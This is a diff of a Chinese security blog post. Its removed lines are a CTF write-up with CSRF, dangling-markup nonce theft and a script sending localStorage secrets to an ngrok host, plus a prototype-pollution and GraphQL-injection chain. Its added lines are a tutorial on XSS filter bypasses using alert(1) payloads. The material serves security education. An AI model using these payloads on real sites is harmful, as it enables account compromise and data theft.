@@ -1,250 +1,86 @@
-``` js
-function isInWindowContext() {
-  const tmp = self;
-  self = 1; // magic
-  const res = (this !== self);
-  self = tmp;
-  return res;
-}
+此文章分成三個主題：
 
-// Ensure it is in window context with correct domain only :)
-// Setting up variables and UI
-if (isInWindowContext() && document.domain === '<%= domain %>') {
-  const urlParams = new URLSearchParams(location.search);
-  try { document.getElementById('error').innerText = urlParams.get('error'); } catch (e) {}
-  try { document.getElementById('message').innerText = urlParams.get('message'); } catch (e) {}
-  try { document.getElementById('_csrf').value = '<%= csrf %>'; } catch (e) {}
-}
-```
+1. 繞過各種限制
+2. XS leaks
+3. 其他你可能不知道的功能
 
-這邊會檢查是不是在 window context 以及 `document.domain`，看到這邊我瞬間想起了 2022 年 10 月的 Intigriti XSS challenge，作者 writeup 在這：https://github.com/0xGodson/blogs/blob/master/_posts/2022-10-14-intigriti-oct-xss-challenge-author-writeup.md
+## 繞過各種限制
 
-裡面有一個部分是用 web worker 來繞過對 `window.location.href` 以及 `document.domain` 的檢查，像是這樣：
+談到前端安全，第一個想到的想必是 XSS，有關 XSS 的文章跟介紹之前寫過不少了，有興趣的話可以參考：[XSS 從頭談起：歷史與由來](https://tech-blog.cymetrics.io/posts/huli/xss-history/)，這邊就不再贅述。
 
-``` js
-// worker.js
-
-window = {}
-window.location = {}
-document = {}
-
-// send the secret to top window!
-window.saveSecret = function(msg){  
-  self.postMessage(msg)  
-}
-
-window.location.href = "https://challenge-1022.intigriti.io/challenge/create";
-document.domain = "challenge-1022.intigriti.io";
-
-// we can use importScripts function from API to import external scripts!
-importScripts("https://challenge-1022.intigriti.io/challenge/getSecret.js");
-```
-
-所以這題特別檢查 context 應該是想把這個擋住，但幸好當時在研究 Intigriti 這個的時候，我發現 `document.domain` 其實可以自己用 `Object.defineProperty` 硬蓋過去，所以這樣就可以 CSRF：
+一個最簡單直覺的 XSS payload 會長這樣：
 
 ``` html
-<script>
-  Object.defineProperty(document, 'domain', {
-    value: '35.200.57.143'
-  })
-</script>
-<input id="_csrf" />
-<script src="https://35.200.57.143:11004/getSettings.js"></script>
-<form id=f method=POST action="https://35.200.57.143:11004/profile" target="_blank">
-  <input name="name" value="poc">
-  <input name="csrf" value="">
-</form>
-
-<script>
-  const csrf = _csrf.value
-  f.csrf.value = csrf
-  f.submit()
-</script>
+<script>alert(1)</script>
 ```
 
-再來就是要偷 nonce 了，這題用的瀏覽器是 Firefox，對於 [Dangling Markup Injection](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection) 似乎沒做什麼防護，可以用 meta redirect 偷到下面的內容：`<meta http-equiv=refresh content='0; url=http://43d1-ip.ngrok.io/steal?q=`
-
-最後一步就是要阻止 `csp.gif` 的載入，因為只要這個被載入的話，nonce 就會改變，我花了一個半小時找尋怎麼把它擋掉，原本想說應該可以靠之前提過的 concurrent limit 來防止，但怎麼弄都不成功。
-
-最後發現原本 `base-uri` 是 `self`，所以 base 是可以用的，那就用 base 就好了，浪費了一小時 QQ
+但這種形式的 XSS 不夠有趣，而且很容易被防禦住，所以我們先暫時不講這個，來看一些比較有趣的，例如說這個：
 
 ``` html
-<script>
-  Object.defineProperty(document, 'domain', {
-    value: '35.200.57.143'
-  })
-</script>
-<input id="_csrf" />
-<script src="https://35.200.57.143:11004/getSettings.js"></script>
-<form id=f method=POST action="https://35.200.57.143:11004/profile" target="test">
-  <input name="name" value="poc">
-  <input name="csrf" value="">
-</form>
-
-<script>
-  var win = window.open('https://35.200.57.143:11004/profile', 'test')
-  fetch('/clear')
-  stealNoncePayload = "<base href='https://35.200.57.143:11004/abc/def/'><meta http-equiv=refresh content='0; url=http://43d1-ip.ngrok.io/steal?q="
-  const csrf = _csrf.value
-  f.csrf.value = csrf
-  f.name.value = stealNoncePayload
-  
-  setTimeout(() => {
-    f.submit()
-  }, 500)
-  
-
-  function poll() {
-    fetch('/nonce')
-      .then(res => res.text())
-      .then(nonce => {
-          if (!nonce) {
-            return setTimeout(poll, 100)
-          }
-          f.name.value = `<script nonce=${nonce}>
-            location = 'http://43d1-ip.ngrok.io?q='+localStorage.getItem('secret')
-          <\/script>`
-          f.submit()
-      })
-  }
-  poll()
-
-</script>
+<img src=non_exist onerror=alert(1)>
 ```
 
-## Momomomomemomemo (3 solves)
+這一段 HTML 利用 event handler 的方式去執行 JavaScript，我們載入一張不存在的圖片，就會觸發 onerror 事件，執行到裡面的程式碼。還有一點值得注意的是，其實屬性不需要加 `""` 也可以。
 
-這題隊友解出來的，也滿有趣的，總之就是前端會根據你提供的 id 用 GraphQL 去抓結果：
+還可以再更進一步，變成這樣：
 
-``` js
-memo(id) {
-    const query = `query { 
-        memo (
-            id: "${id}", 
-            token: "${this.token}") {
-                content
-            } 
-        }`;
-    return this.#query(query);
-}
+``` html
+<svg onload=alert(1)>
 ```
 
-在最後 query 的部分是使用了 [persisted queries](https://www.apollographql.com/docs/apollo-server/performance/apq/)，以前有聽過，大概就是你先送 query 的 hash 出去，如果以前就有執行過的話，會直接送結果回來。
+這次連 src 都不需要了，直接用 `<svg>` 搭配 `onload` 事件去執行程式碼。
 
-反之若是沒有，你就再送一次 hash + query，讓後端去 cache 結果，而前端的實作是這樣：
+假設小明是一位後端工程師，責任是去過濾這些輸入的字串，讓它不要產生 XSS 漏洞，除了過濾 `<script>` 以外，小明也過濾了空格。理由很簡單，像是這種用屬性來執行的 XSS，屬性跟標籤之間一定要有空格對吧？那一旦把空格濾掉，不就沒辦法利用屬性來做 XSS 了嗎？
 
-``` js
-async #query(query) {
-    const hash = await this.#getQueryHash(query);
-    const res = await fetch(
-        this.endpoint +
-            "?" +
-            new URLSearchParams({
-                extensions: JSON.stringify({
-                    persistedQuery: { version: 1, sha256Hash: hash },
-                }),
-            }),
-        {
-            headers: { "Content-type": "application/json" },
-        }
-    );
-    const data = await res.clone().json();
-    if (data.errors) {
-        if (data.errors[0].extensions.code == "PERSISTED_QUERY_NOT_FOUND") {
-            return await fetch(this.endpoint, {
-                method: "POST",
-                headers: { "Content-type": "application/json" },
-                body: JSON.stringify({
-                    query,
-                    extensions: {
-                        persistedQuery: {
-                            version: 1,
-                            sha256Hash: hash,
-                        },
-                    },
-                }),
-            });
-        }
-    }
-    return res;
-}
+天真的小明踢到了鐵板，因為其實可以這樣：
+
+``` html
+<svg/onload=alert(1)>
+<svg    onload=alert(1)>
+<svg
+onload=alert(1)>
 ```
 
-這邊前端也用了 Purl 這個 lib，所以一樣有 prototype pollution 可以用，但這題可以污染什麼呢？答案在底下這一段裡面：
+除了空格以外，`/`、tab 還有換行都是合法的分隔符號，所以如果只取代空格的話是沒有用的。
 
-``` js
-const purl = window.purl
+小明知道這個規則以後，察覺到根本問題其實不是空格，而是 `onxxx` 這種以 on 開頭的 event handler，於是他把 on 開頭的屬性全都過濾掉了，心想：「只要沒辦法用 event handler，就沒辦法 XSS 吧？」
 
-const memoId = purl().param('id')
+聽起來十分合理，但他不知道的是，就算沒有 event handler 也可以：
 
-const gql = new GraphQL(location.origin)
-
-class GraphQL {
-    constructor(host, option = {}) {
-        this.endpoint = host + "/";
-        this.endpoint += option.path || "graphql";
-    }
-    // ...
-}
+``` html
+<iframe/src="javascript:alert(1)">
 ```
 
-你可以污染 path，就能操控 `option.path`，但操控這個可以做什麼？這就跟後端的 i18n 邏輯有關了，實作如下：
+`javascript:` 開頭的字串稱為 JavaScript pseudo protocol，在一些地方可以用來執行程式碼，之前我們在[《在做跳轉功能時應該注意的問題：Open Redirect》](https://tech-blog.cymetrics.io/posts/huli/open-redirect/)中就有提過這個特性。
 
-``` js
-// simple i18n
-app.use(function (req, res, next) {
-    let origPath = req.originalUrl.split('?')[0]
-    let origParam = req.originalUrl.split('?')[1]
-    let langPath = 'en/'
-    
-  
-    if (origPath.match(/((\/en\/?)|(\/ja\/?))$/) || origPath.match(/^(\/static\/|\/graphql\/?|\/favicon.ico\/?)/)) {
-      next()
-    } else {
-      if (req.headers['accept-language'] && req.headers['accept-language'].split(',')[0] === 'ja') langPath = 'ja/'
-      res.redirect(origPath + (origPath.endsWith('/') ? '' : '/') + langPath + (origParam ? '?' + origParam : ''))
-    }
-  })
+小明的防禦再度破功，只好再次加強，把 `javascript` 這個看起來很危險的字串取代掉，這樣應該就沒事了吧？
+
+殊不知，原來在 `javascript` 這幾個字中間塞入 tab 以後，居然還是有效：
+
+``` html
+<iframe/src="javas    cript:alert(1)">
 ```
 
-要注意的是 `req.originalUrl` 只會有 path 的部分，所以像 http://chall:11005/abc 的話，originalUrl 就會是 `/abc`。
+小明修正了程式碼，把那些有的沒的像是空白、空行或是 tab 全都取代成空字串，然後再檢查一次有沒有 `javascript`，有的話就過濾掉，如此一來，上面的 payload 就無法運作了。
 
-靠著上面操控的 path，我們可以把 path 污染成 `/huli.tw/`，這樣送出的 URL 就是：`http://34.85.126.119:11005//huli.tw/?extensions=...`，到了後端的 redirect 邏輯，最後就會被導到 `//huli.tw/en/?extension=...`。
+但小明忘記網頁上的資訊是可以編碼的，例如說你想在畫面上呈現 `<h1>`，你要編碼成 `&lt;h1&gt;`，這樣畫面呈現的是你要的東西，而不是被當作 h1 標籤來解析。除了那些特殊符號，一般的文字也可以用 `&#{ascii_code};` 來編碼，例如說 `j` 的 ascii code 是 106，就可以編碼成 `&#106;`：
 
-如此一來，就可以靠著 prototype pollution 把 request 導到自己的 server，拿到 query string。
-
-這題的目的是要偷 admin 的 memo，可是我們並不知道 admin memo id，要怎麼辦呢？
-
-仔細看這一段：
-
-``` js
-memo(id) {
-    const query = `query { 
-        memo (
-            id: "${id}", 
-            token: "${this.token}") {
-                content
-            } 
-        }`;
-    return this.#query(query);
-}
+``` html
+<iframe/src="&#106;avascript:alert(1)">
 ```
 
-我們可以精心構造一個 id 達成 GraphQL injection，像這樣：
+如果你想要的話，可以把整串字全部都編碼，就只會剩下一些符號跟數字而已。
 
-``` js
-query { 
-  memo (
-    id: "a", token: "b"
-  ) { content }
+惱怒的小明這次不演了，直接禁用 `src` 屬性，想說「那我把 src 都禁用就沒事了吧？不要再來煩我了！」
 
-  memo2: memos(
-    token: "${this.token}") {
-        content
-    } 
-}
+但他忘記的事情是，`<a>` 也可以用這個屬性：
+
+``` html
+<a/href="&#106;avascript:alert(1)">點我</a>
 ```
 
-這樣就變成了兩個 query，原本應該是 memo 的 token 變成了 memos 的 token，就可以拿到所有 admin 的 note。
+只是這次就不會自動觸發了，需要使用者主動點擊才能觸發。
 
-因此，最後的解法就是先送一次這個改造過的 query，讓 server 把結果存起來，再加上 prototype pollution，讓 request 導到我們的 server，就可以知道 hash 是多少，就能拿到結果。
+最後小明真的受不了了，於是覆蓋了一張 [DOMPurify](https://github.com/cure53/DOMPurify)，結束這個回合。
+
+除了上面的這些標籤跟屬性的繞過以外，JavaScript 本身的繞過也滿好玩的，例如說：「有沒有辦法在不使用 `()` 的狀況下執行函式？」
